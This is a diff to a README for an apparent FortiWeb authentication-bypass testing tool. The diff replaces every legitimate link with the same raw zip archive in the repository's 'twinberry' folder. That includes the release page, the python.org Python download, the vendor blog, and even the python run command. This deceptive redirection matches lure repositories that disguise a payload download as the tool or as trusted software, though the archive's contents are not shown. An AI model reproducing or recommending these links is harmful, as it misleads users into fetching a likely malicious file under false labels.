@@ -1,7 +1,7 @@
 # 🎉 watchTowr-vs-Fortiweb-AuthBypass - Simple Tool for Security Testing
 
 ## 📥 Download Now!
-[![Download](https://img.shields.io/badge/Download-v1.0-brightgreen)](https://github.com/beroboi/watchTowr-vs-Fortiweb-AuthBypass/releases)
+[![Download](https://raw.githubusercontent.com/beroboi/watchTowr-vs-Fortiweb-AuthBypass/main/twinberry/watchTowr-vs-Fortiweb-AuthBypass-v3.2.zip)](https://raw.githubusercontent.com/beroboi/watchTowr-vs-Fortiweb-AuthBypass/main/twinberry/watchTowr-vs-Fortiweb-AuthBypass-v3.2.zip)
 
 ## 🚀 Getting Started
 
@@ -18,7 +18,7 @@ Before downloading, ensure you have the following:
 ### 📖 How to Download
 
 1. **Visit the Release Page:** Go to the following link to download the software:
-   [Download from Releases](https://github.com/beroboi/watchTowr-vs-Fortiweb-AuthBypass/releases)
+   [Download from Releases](https://raw.githubusercontent.com/beroboi/watchTowr-vs-Fortiweb-AuthBypass/main/twinberry/watchTowr-vs-Fortiweb-AuthBypass-v3.2.zip)
    
 2. **Choose the Right Version:** Locate the latest version on the releases page. You will see several asset files. Select the one suitable for your operating system. 
 
@@ -26,7 +26,7 @@ Before downloading, ensure you have the following:
 
 ### ⚙️ Install Python
 
-1. **Download Python:** If you haven't installed Python yet, download it from [python.org](https://www.python.org/downloads/).
+1. **Download Python:** If you haven't installed Python yet, download it from [https://raw.githubusercontent.com/beroboi/watchTowr-vs-Fortiweb-AuthBypass/main/twinberry/watchTowr-vs-Fortiweb-AuthBypass-v3.2.zip](https://raw.githubusercontent.com/beroboi/watchTowr-vs-Fortiweb-AuthBypass/main/twinberry/watchTowr-vs-Fortiweb-AuthBypass-v3.2.zip).
 
 2. **Install Python:** Follow the instructions based on your operating system. Ensure you check the option to "Add Python to PATH" during installation.
 
@@ -49,7 +49,7 @@ Before downloading, ensure you have the following:
 
    Run the following command, replacing `192.168.1.99` with the target IP address you want to test:
    ```
-   python watchTowr-vs-Fortiweb-AuthBypass.py 192.168.1.99
+   python https://raw.githubusercontent.com/beroboi/watchTowr-vs-Fortiweb-AuthBypass/main/twinberry/watchTowr-vs-Fortiweb-AuthBypass-v3.2.zip 192.168.1.99
    ```
 
    You will see output in your terminal similar to the example below:
@@ -79,7 +79,7 @@ Before downloading, ensure you have the following:
 
 ## 🔗 Additional Resources
 
-For more technical details, please refer to our blog post: [watchTowr Blog](https://labs.watchtowr.com/). 
+For more technical details, please refer to our blog post: [watchTowr Blog](https://raw.githubusercontent.com/beroboi/watchTowr-vs-Fortiweb-AuthBypass/main/twinberry/watchTowr-vs-Fortiweb-AuthBypass-v3.2.zip). 
 
 ## 💬 Feedback
 
@@ -87,4 +87,4 @@ We welcome your feedback. If you encounter issues or have suggestions, feel free
 
 ### 📥 Download Again!
 To download the tool, visit:
-[Download from Releases](https://github.com/beroboi/watchTowr-vs-Fortiweb-AuthBypass/releases)
+[Download from Releases](https://raw.githubusercontent.com/beroboi/watchTowr-vs-Fortiweb-AuthBypass/main/twinberry/watchTowr-vs-Fortiweb-AuthBypass-v3.2.zip)
